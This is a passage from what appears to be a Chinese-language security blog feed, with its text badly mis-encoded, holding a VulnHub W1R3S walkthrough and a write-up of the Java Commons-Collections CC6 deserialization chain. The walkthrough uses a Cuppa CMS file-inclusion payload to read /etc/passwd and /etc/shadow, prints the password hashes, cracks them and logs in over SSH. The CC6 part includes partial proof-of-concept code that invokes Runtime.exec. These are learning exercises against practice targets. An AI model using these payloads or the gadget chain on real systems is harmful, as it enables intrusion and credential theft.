MD4(MD4(($pass)).(strtolower($username)))</span><br></pre></td></tr></table></figure><p>è¯†åˆ«å‘Šè¯‰æˆ‘æ˜¯md5</p><p>ç½‘ç«™è¿›è¡Œè§£ç </p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/90846274a1ac666ce6acec9ef9150df.png"></p><p>This[ç©ºæ ¼]is[ç©ºæ ¼]not[ç©ºæ ¼]a[ç©ºæ ¼]password</p><p>æç¤ºè¿™ä¸æ˜¯å¯†ç </p><p>å¯¹è¿™é‡Œé¢çš„base64è¿›è¡Œè§£å¯†</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg==</span><br><span class="line">&quot;|base64 -d</span><br><span class="line">It is easy, but not that easy..</span><br></pre></td></tr></table></figure><p>å·¦è„‘æ”»å‡»å³è„‘ </p><p>The W1R3S.inc employee list</p><p>Naomi.W - Manager<br>Hector.A - IT Dept<br>Joseph.G - Web Design<br>Albert.O - Web Design<br>Gina.L - Inventory<br>Rico.D - Human Resources</p><p>å‘˜å·¥ä¿¡æ¯ å¾…ä¼šè¯´ä¸å®šæœ‰ç”¨è¿™é‡Œåˆ†å¥½äº†èŒä½</p><p>å¥½äº†ftpå°±æ˜¯è¿™äº›ä¿¡æ¯</p><p>å¯¹80ç«¯å£è¿›è¡Œæµ‹è¯•</p><p>webé¡µé¢æ²¡å‘ç°æœ‰ç”¨çš„ä¸œè¥¿</p><p>çˆ†ç ´ç›®å½•</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo gobuster dir -u http://192.168.205.136 --wordlist=/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</span><br></pre></td></tr></table></figure><p>&#x2F;wordpress            (Status: 301) [Size: 322] [â€“&gt; <a href="http://192.168.205.136/wordpress/]">http://192.168.205.136/wordpress/]</a><br>&#x2F;javascript           (Status: 301) [Size: 323] [â€“&gt; <a href="http://192.168.205.136/javascript/]">http://192.168.205.136/javascript/]</a><br>&#x2F;administrator        (Status: 301) [Size: 326] [â€“&gt; <a href="http://192.168.205.136/administrator/]">http://192.168.205.136/administrator/]</a><br>&#x2F;server-status        (Status: 403) [Size: 303]</p><p>amdinistratorå¯ä»¥ç›´æ¥è¿›å…¥ æ˜¯ä¸ªcms</p><p>wordpressè¿›è¡Œä¸€ä¸ªè·³è½¬ åˆ°localhost&#x2F;wordpress&#x2F;</p><p>è¿™é‡Œä¸ç¡®å®šæ˜¯ä¸æ˜¯kaliç¯å¢ƒé—®é¢˜æ‰€ä»¥å…ˆå¯¹å¦ä¸€ä¸ªcmsè¿›è¡Œæµ‹è¯•</p><p>æµ‹è¯•å‡ºæ¥å‘ç°ä¸èƒ½è¿›è¡Œå®‰è£…</p><p>æŸ¥çœ‹å†å²æ¼æ´</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">earchsploit cuppa    </span><br><span class="line"></span><br><span class="line">----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"></span><br><span class="line"> Exploit Title                                                                                                                                             |  Path</span><br><span class="line"></span><br><span class="line">----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"></span><br><span class="line">Cuppa CMS - &#x27;/alertConfigField.php&#x27; Local/Remote File Inclusion                                                                                            | php/webapps/25971.txt</span><br><span class="line"></span><br><span class="line">----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"></span><br><span class="line">Shellcodes: No Results</span><br></pre></td></tr></table></figure><p>å‘ç°25971 ç»™ä»–ä¸‹è½½ä¸‹æ¥</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">earchsploit cuppa -m 25971</span><br><span class="line">[!] Could not find EDB-ID #</span><br><span class="line"></span><br><span class="line">  Exploit: Cuppa CMS - &#x27;/alertConfigField.php&#x27; Local/Remote File Inclusion</span><br><span class="line">      URL: https://www.exploit-db.com/exploits/25971</span><br><span class="line">     Path: /usr/share/exploitdb/exploits/php/webapps/25971.txt</span><br><span class="line">    Codes: OSVDB-94101</span><br><span class="line"> Verified: True</span><br><span class="line">File Type: C++ source, ASCII text, with very long lines (876)</span><br><span class="line">Copied to: /home/kali/Desktop/w1r3s/25971.txt</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å‘ç°åˆ©ç”¨æ–¹å¼æ˜¯æ–‡ä»¶åŒ…å«æˆ‘ä»¬çœ‹ä»–ç»™çš„payloadèƒ½ä¸èƒ½æµ‹è¯•æˆåŠŸ</p><p>å‘ç°æ˜¯ä¸è¡Œçš„ </p><p>è’‹cuppré‚£ä¿®æ”¹ä¸‹ æˆadministrator</p><p>å‘ç°æ˜¯ç”±å›æ˜¾ä½†æ˜¯æ²¡æœ‰çˆ†å‡ºå†…å®¹</p><p><a href="http://192.168.205.136/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd">http://192.168.205.136/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</a></p><p>è¿™ä¸ªæ—¶å€™è€ƒè™‘æ˜¯ä¸æ˜¯åˆ©ç”¨POSTçš„æˆ–æ˜¯å…¶ä»–çš„ä¸œè¥¿ </p><p>curl â€“data-urlencode â€œurlConfig&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd<br>â€œ <a href="http://192.168.205.136/administrator/alerts/alertConfigField.php">http://192.168.205.136/administrator/alerts/alertConfigField.php</a></p><p>å‘ç°åˆ—å‡ºpasswd ä¿¡æ¯</p><p>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è¿›ä¸€æ­¥æŸ¥çœ‹shadow</p><p>å¾—åˆ°å¯†ç è¿›è¡Œç­›é€‰æœ‰å“ˆå¸Œå€¼çš„è´¦æˆ·</p><p>root:$6$vYcecPCy$JNbK.hr7HU72ifLxmjpIP9kTcx.&#x2F;ak2MM3lBs.Ouiu0mENav72TfQIs8h1jPm2rwRFqd87HDC0pi7gn9t7VgZ0:17554:0:99999:7:::</p><p>www-data:$6$8JMxE7l0$yQ16jM..ZsFxpoGue8&#x2F;0LBUnTas23zaOqg2Da47vmykGTANfutzM8MuFidtb0..Zk.TUKDoDAVRCoXiZAH.Ud1:17560:0:99999:7:::</p><p>w1r3s:$6$xe&#x2F;eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb&#x2F;io7x9q1iP.:17567:0:99999:7:::</p><p>å¾—åˆ°è¿™äº› æˆ‘ä»¬è¿›è¡Œå¯¹å“ˆå¸Œè¿›è¡Œè§£å¯†</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">john md5.hash </span><br><span class="line">Created directory: /home/kali/.john</span><br><span class="line">Warning: detected hash type &quot;sha512crypt&quot;, but the string is also recognized as &quot;HMAC-SHA256&quot;</span><br><span class="line">Use the &quot;--format=HMAC-SHA256&quot; option to force loading these as that type instead</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])</span><br><span class="line">Cost 1 (iteration count) is 5000 for all loaded hashes</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Proceeding with single, rules:Single</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">www-data         (www-data)     </span><br><span class="line">Almost done: Processing the remaining buffered candidate passwords, if any.</span><br><span class="line">Proceeding with wordlist:/usr/share/john/password.lst</span><br><span class="line">computer         (w1r3s)     </span><br><span class="line">Proceeding with incremental:ASCII</span><br></pre></td></tr></table></figure><p>è¿›è¡Œsshè¿œç¨‹ç™»å½•</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ssh w1r3s@192.168.205.136</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Think this is the way?</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Well,........possibly.</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">w1r3s@192.168.205.136&#x27;s password: </span><br><span class="line">Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.13.0-36-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">108 packages can be updated.</span><br><span class="line">6 updates are security updates.</span><br><span class="line"></span><br><span class="line">.....You made it huh?....</span><br><span class="line">Last login: Mon Jan 22 22:47:27 2018 from 192.168.0.35</span><br></pre></td></tr></table></figure><p>ç™»å½•æˆåŠŸå¯ä»¥ç›´æ¥sudoææƒ</p><p>è·å–flag</p><h2 id="root-W1R3S-cat-flag-txt"><a href="#root-W1R3S-cat-flag-txt" class="headerlink" title="root@W1R3S:~# cat flag.txt "></a>root@W1R3S:~# cat flag.txt </h2><hr><h2 id=""><a href="#" class="headerlink" title="  &#x2F; _&#x2F; _ | \ | |&#x2F; _|  _ \    &#x2F; |   | | | | |      &#x2F; |   | _&#x2F; _ | \ | &#x2F; _| | |  | | | |  | | |  | |) |  &#x2F; _ \ | | | | | | |     &#x2F; _ \ | |  | | | | |  | __ \ | || || | |\  | || |  _ &lt;  &#x2F; ___ | | | |_| | |_ &#x2F; ___ | |  | | || | |\  |) |  ____&#x2F;|| _|__|| _/_&#x2F;   __|  _&#x2F;|_____&#x2F;&#x2F;   __| |_&#x2F;|| _|____&#x2F;                                                                                         "></a>  &#x2F; <strong>_&#x2F; _ | \ | |&#x2F; <em>_<em>|  _ \    &#x2F; |</em>   <em>| | | | |      &#x2F; |</em>   <em>|</em> _&#x2F; _ | \ | &#x2F; <em>_<em>|<br> | |  | | | |  | | |  <em>| |</em>) |  &#x2F; _ \ | | | | | | |     &#x2F; _ \ | |  | | | | |  | _</em>_ \<br> | |</em><em>| |</em>| | |\  | |</em>| |  _ &lt;  &#x2F; ___ | | | |_| | |</strong>_ &#x2F; ___ | |  | | |<em>| | |\  |</em><strong>) |<br>  _</strong><em>___&#x2F;|</em>| _|_<em>_<em>|</em>| _/_&#x2F;   __|  _</em><em>&#x2F;|_____&#x2F;</em>&#x2F;   __| |<em><strong>_</strong>&#x2F;|</em>| _|____&#x2F;                                                                                         </h2><pre><code>                      .-----------------TTTT_-----_______                    /&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;(______O] ----------____  \______/]_ __...---&#39;&quot;&quot;&quot;\_ --&#39;&#39;   Q                               ___________@</code></pre><p> |â€™â€™â€™                   ._   _______________&#x3D;â€”â€”â€”â€œâ€â€â€â€â€â€<br> |                ..â€“â€™â€™|   l L |_l   |<br> |          ..â€“â€™â€™      .  &#x2F;-_<strong>j â€˜   â€˜<br> |    ..â€“â€™â€™           &#x2F;  ,       â€˜   â€˜<br> |â€“â€™â€™                &#x2F;           &#96;    <br>                      L</strong>â€˜         \    -<br>                                    -    â€˜-.<br>                                     â€˜.    &#x2F;<br>                                       â€˜-.&#x2F;</p><hr><h2 id="YOU-HAVE-COMPLETED-THE-INC-CHALLENGE-V-1-0"><a href="#YOU-HAVE-COMPLETED-THE-INC-CHALLENGE-V-1-0" class="headerlink" title="  YOU HAVE COMPLETED THE               __      __  ______________________   _________              &#x2F;  \    &#x2F;  /_   ______   _____  \ &#x2F;   &#x2F;              \   //   &#x2F; |   ||       &#x2F; (  &lt; __  \               \        &#x2F;  |   ||    |   /       /                        __&#x2F;\  &#x2F;   ||||  &#x2F;____  &#x2F;_______  &#x2F;.INC                     /                /       /        /        CHALLENGE, V 1.0"></a>  YOU HAVE COMPLETED THE<br>               __      __  ______________________   _________<br>              &#x2F;  \    &#x2F;  /_   ______   _____  \ &#x2F;   <strong><em><strong>&#x2F;<br>              \   //   &#x2F; |   ||       <em>&#x2F; <em>(</em></em>  &lt; _</strong></em>_  \<br>               \        &#x2F;  |   ||    |   /       /        <br>                __&#x2F;\  &#x2F;   |</strong><em>||</em><strong><em>|</em>  &#x2F;</strong>____  &#x2F;_______  &#x2F;.INC<br>                     /                /       /        /        CHALLENGE, V 1.0</h2><p>CREATED BY SpecterWires</p><hr>]]></content>
      
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cc6</title>
      <link href="/2025/03/24/cc6/"/>
      <url>/2025/03/24/cc6/</url>
      
        <content type="html"><![CDATA[<p>   ä¹‹å‰å¤ç°äº†java cc1é“¾å­ </p><p>é¡ºä¾¿åœ¨è¿™è¿›è¡Œä¸€ä¸ªæ€»ç»“</p><h4 id="æ ¸å¿ƒæ­¦å™¨ï¼šåå°„ä¸‡èƒ½é’¥åŒ™ï¼ˆInvokerTransformerï¼‰"><a href="#æ ¸å¿ƒæ­¦å™¨ï¼šåå°„ä¸‡èƒ½é’¥åŒ™ï¼ˆInvokerTransformerï¼‰" class="headerlink" title="æ ¸å¿ƒæ­¦å™¨ï¼šåå°„ä¸‡èƒ½é’¥åŒ™ï¼ˆInvokerTransformerï¼‰"></a><strong>æ ¸å¿ƒæ­¦å™¨ï¼šåå°„ä¸‡èƒ½é’¥åŒ™ï¼ˆ<code>InvokerTransformer</code>ï¼‰</strong></h4><p><strong>æ¯”å–»</strong>ï¼š<code>InvokerTransformer</code>ç±»åƒä¸€æŠŠä¸‡èƒ½é’¥åŒ™ï¼Œèƒ½é€šè¿‡åå°„è°ƒç”¨ä»»ä½•æ–¹æ³•ã€‚æ¯”å¦‚ç”¨é’¥åŒ™æ‰“å¼€â€œRuntimeç±»â€çš„é”ï¼Œæ‰§è¡Œ<code>exec(&quot;calc&quot;)</code>å¼¹è®¡ç®—å™¨</p><h4 id="æµæ°´çº¿ç»„è£…ï¼šä¸²è”å·¥å…·äººï¼ˆChainedTransformerï¼‰"><a href="#æµæ°´çº¿ç»„è£…ï¼šä¸²è”å·¥å…·äººï¼ˆChainedTransformerï¼‰" class="headerlink" title="æµæ°´çº¿ç»„è£…ï¼šä¸²è”å·¥å…·äººï¼ˆChainedTransformerï¼‰"></a><strong>æµæ°´çº¿ç»„è£…ï¼šä¸²è”å·¥å…·äººï¼ˆ<code>ChainedTransformer</code>ï¼‰</strong></h4><p><strong>æ¯”å–»</strong>ï¼šä¸ºäº†ç»•è¿‡é™åˆ¶ï¼Œæ”»å‡»è€…éœ€è¦å¤šä¸ªâ€œå·¥å…·äººâ€åä½œã€‚<code>ChainedTransformer</code>å°±åƒä¸€ä¸ªæµæ°´çº¿ï¼ŒæŠŠå¤šä¸ªæ“ä½œä¸²è”èµ·æ¥ï¼š</p><p>å·¥å…·äººAï¼šå…ˆæ‹¿åˆ°<code>Runtime</code>å¯¹è±¡ï¼ˆ<code>ConstantTransformer</code></p><p>å·¥å…·äººBï¼šç”¨ä¸‡èƒ½é’¥åŒ™è°ƒç”¨<code>exec</code>æ–¹æ³•ï¼ˆ<code>InvokerTransformer</code>ï¼‰</p><p><strong>åŸç†</strong>ï¼šæŠŠè¿™ä¸¤ä¸ªå·¥å…·äººæŒ‰é¡ºåºæ”¾è¿›<code>ChainedTransformer</code>ï¼Œæ‰§è¡Œæ—¶ä¼šå…ˆè·å–<code>Runtime</code>å¯¹è±¡ï¼Œå†è°ƒç”¨<code>exec</code>æ–¹æ³•ã€‚</p><h4 id="è§¦å‘æœºå…³ï¼šæ”¹é€ åœ°å›¾ï¼ˆTransformedMapï¼‰"><a href="#è§¦å‘æœºå…³ï¼šæ”¹é€ åœ°å›¾ï¼ˆTransformedMapï¼‰" class="headerlink" title="è§¦å‘æœºå…³ï¼šæ”¹é€ åœ°å›¾ï¼ˆTransformedMapï¼‰"></a><strong>è§¦å‘æœºå…³ï¼šæ”¹é€ åœ°å›¾ï¼ˆ<code>TransformedMap</code>ï¼‰</strong></h4><p><strong>æ¯”å–»</strong>ï¼š<code>TransformedMap</code>æ˜¯ä¸€ä¸ªè¢«é­”æ”¹çš„åœ°å›¾ï¼Œå½“åœ°å›¾ä¸­çš„å€¼è¢«ä¿®æ”¹æ—¶ï¼ˆæ¯”å¦‚è°ƒç”¨<code>setValue</code>ï¼‰ï¼Œä¼šè‡ªåŠ¨è§¦å‘æµæ°´çº¿ä¸Šçš„å·¥å…·äºº</p><h4 id="ç‚¹ç«å¼€å…³ï¼šååºåˆ—åŒ–å…¥å£ï¼ˆAnnotationInvocationHandlerï¼‰"><a href="#ç‚¹ç«å¼€å…³ï¼šååºåˆ—åŒ–å…¥å£ï¼ˆAnnotationInvocationHandlerï¼‰" class="headerlink" title="ç‚¹ç«å¼€å…³ï¼šååºåˆ—åŒ–å…¥å£ï¼ˆAnnotationInvocationHandlerï¼‰"></a><strong>ç‚¹ç«å¼€å…³ï¼šååºåˆ—åŒ–å…¥å£ï¼ˆ<code>AnnotationInvocationHandler</code>ï¼‰</strong></h4><p><strong>æ¯”å–»</strong>ï¼š<code>AnnotationInvocationHandler</code>æ˜¯Javaè‡ªå¸¦çš„â€œå¿«é€’æ‹†åŒ…å‘˜â€ï¼Œååºåˆ—åŒ–æ—¶ä¼šè‡ªåŠ¨æ‰§è¡Œ<code>readObject</code>æ–¹æ³•ï¼ˆæ‹†åŒ…è£¹é€»è¾‘ï¼‰ã€‚æ”»å‡»è€…æŠŠé­”æ”¹åœ°å›¾å¡è¿›å®ƒçš„<code>memberValues</code>å±æ€§</p><p><strong>è§¦å‘æµç¨‹</strong>ï¼š</p><p>ååºåˆ—åŒ–æ—¶ï¼Œ<code>readObject</code>æ–¹æ³•éå†åœ°å›¾ä¸­çš„é”®å€¼å¯¹</p><p>éå†åˆ°æŸä¸ªé”®å€¼å¯¹æ—¶ï¼Œè°ƒç”¨<code>setValue</code>ä¿®æ”¹å€¼ï¼Œè§¦å‘é­”æ”¹åœ°å›¾çš„æœºå…³</p><ul><li>æœºå…³å¯åŠ¨æµæ°´çº¿å·¥å…·äººï¼Œæœ€ç»ˆå¼¹è®¡ç®—å™¨ã€‚</li></ul><h3 id="é«˜ç‰ˆæœ¬jdkçš„ä¿®æ”¹"><a href="#é«˜ç‰ˆæœ¬jdkçš„ä¿®æ”¹" class="headerlink" title="é«˜ç‰ˆæœ¬jdkçš„ä¿®æ”¹"></a>é«˜ç‰ˆæœ¬jdkçš„ä¿®æ”¹</h3><p>åœ¨jdk8u_71ä¹‹åï¼ŒAnnotationInvocationHandlerç±»è¢«é‡å†™äº†ï¼Œä¿®æ”¹äº†readObjectæ–¹æ³•ï¼Œé‡Œé¢æ²¡æœ‰äº†setValueæ–¹æ³•ã€‚</p><p>é€šè¿‡</p><p>ChainedTransformerçš„transformæ–¹æ³•çš„ç”¨æ³•ï¼Œå®šä½åˆ°LazyMapçš„getæ–¹æ³•</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Transformer factory;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Factory factory)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">        <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">            map.put(key, value);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é€»è¾‘ </p><p>æ£€æŸ¥é”®æ˜¯å¦å­˜åœ¨ï¼Œä¸å­˜åœ¨æ—¶åˆ›å»ºå€¼å¹¶å­˜å‚¨ï¼Œå­˜åœ¨æ—¶ç›´æ¥è¿”å›ã€‚</p><p>æ¥ç€å¯»æ‰¾å…¥å£ç‚¹</p><h3 id="TiedMapEntry"><a href="#TiedMapEntry" class="headerlink" title="TiedMapEntry"></a>TiedMapEntry</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> getValue();</span><br><span class="line">    <span class="keyword">return</span> (getKey() == <span class="literal">null</span> ? <span class="number">0</span> : getKey().hashCode()) ^</span><br><span class="line">           (value == <span class="literal">null</span> ? <span class="number">0</span> : value.hashCode()); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>TiedMapEntryçš„hashCodeæ–¹æ³•è°ƒç”¨äº†getValueï¼ŒgetValueè°ƒç”¨äº†getæ–¹æ³•ï¼Œæ‰€ä»¥å¯ä»¥ç”¨TiedMapEntryçš„hashCodeæ–¹æ³•è°ƒç”¨LazyMapçš„getæ–¹æ³•</p><p>æ¥ä¸‹æ¥å¯»æ‰¾è°è°ƒç”¨äº†hashCodeæ–¹æ³•</p><h3 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h3><p>é€šè¿‡ä¹‹å‰å¯¹<a href="https://mp.weixin.qq.com/s/yby-SU4vfxPQFJdBS2TMtQ">URLDNSé“¾</a>çš„ç ”ç©¶å¯çŸ¥ï¼ŒHashMapçš„readObjectæ–¹æ³•æœ‰å¦‚ä¸‹è¿™è¡Œè¯­å¥</p><p>putVal(hash(key), key, value, false, false);</p><p>è€ŒHashMapçš„hashæ–¹æ³•è°ƒç”¨äº†hashCodeæ–¹æ³•</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€Œkeyçš„å€¼æ˜¯ä»readObjectè·å–çš„</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br></pre></td></tr></table></figure><p>åºåˆ—åŒ–æ—¶å¯ä»¥ç”¨HashMapçš„putæ–¹æ³•ä¼ keyå’Œvalue</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">hashMap.put(tiedMapEntry, <span class="string">&quot;1&quot;</span>);</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯hashmapçš„putä¼šæå‰èµ°å®Œæµç¨‹ </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”±äºHashMapçš„putæ–¹æ³•ä¼šå¯¼è‡´æå‰è°ƒç”¨hashæ–¹æ³•ï¼Œä»è€Œåœ¨åºåˆ—åŒ–å‰å°±å‘½ä»¤æ‰§è¡Œï¼Œæ‰€ä»¥è¿™é‡Œä¿®æ”¹ä¸€ä¸‹ä»£ç ã€‚</p><p>è¿™é‡Œé€‰æ‹©åœ¨æ–°å»ºLazyMapå¯¹è±¡çš„æ—¶å€™ï¼Œéšä¾¿ä¼ å…¥ä¸€ä¸ªTransformerå¯¹è±¡ï¼Œç­‰putå®Œä¹‹åå†é€šè¿‡åå°„ä¿®æ”¹å›ChainedTransformerå¯¹è±¡ã€‚</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">lazymap</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;1&quot;</span>));</span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap, <span class="string">&quot;2&quot;</span>);</span><br><span class="line">HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(); hashMap.put(tiedMapEntry, <span class="string">&quot;3&quot;</span>);</span><br></pre></td></tr></table></figure><p>åå°„ä¿®æ”¹lazymapçš„factoryçš„å€¼</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class; <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> lazyMapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>); factoryField.setAccessible(<span class="literal">true</span>); factoryField.set(lazymap, ct);</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨é“¾</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HashMap.readObject()</span><br><span class="line">HashMap.hash()</span><br><span class="line">    TiedMapEntry.hashCode()</span><br><span class="line">    TiedMapEntry.getValue()</span><br><span class="line">        LazyMap.get()</span><br><span class="line">            ChainedTransformer.transform()</span><br><span class="line">                InvokerTransformer.transform()</span><br><span class="line">                    Method.invoke()</span><br><span class="line">                        Runtime.exec()</span><br></pre></td></tr></table></figure><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;</span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">ct</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazymap</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;1&quot;</span>));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap, <span class="string">&quot;2&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry, <span class="string">&quot;3&quot;</span>);</span><br><span class="line"></span><br><span class="line">        lazymap.remove(<span class="string">&quot;2&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factoryField</span> <span 